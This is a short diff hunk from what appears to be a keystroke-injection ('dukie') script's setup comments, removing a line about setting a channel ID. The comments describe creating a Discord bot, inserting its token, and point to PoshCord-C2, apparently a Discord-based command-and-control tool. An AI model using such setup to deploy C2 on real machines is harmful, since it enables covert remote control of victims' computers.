@@ -8,7 +8,6 @@ REM SETUP
 REM make a discord bot at https://discord.com/developers/applications/
 REM add the bot to your discord server
 REM Change BOT_TOKEN below with your bot token
-REM Change CHANNEL_ID below to your channel id
 REM for more info goto - https://github.com/beigeworm/PoshCord-C2
 
 REM some setup for dukie script
